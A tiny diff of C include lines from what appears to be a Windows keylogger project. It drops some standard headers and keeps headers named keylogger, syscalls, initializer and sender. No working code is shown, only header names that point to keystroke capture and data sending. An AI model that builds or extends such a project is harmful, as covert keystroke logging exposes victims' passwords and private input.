@@ -1,9 +1,5 @@
-#include <stdbool.h>
-#include <stdio.h>
 #include <windows.h>
-
 #include "keylogger/keylogger.h"
-#include "utils/common/utils.h"
 #include "utils/init/initializer.h"
 #include "syscalls/syscalls.h"
 #include "sender/sender.h"
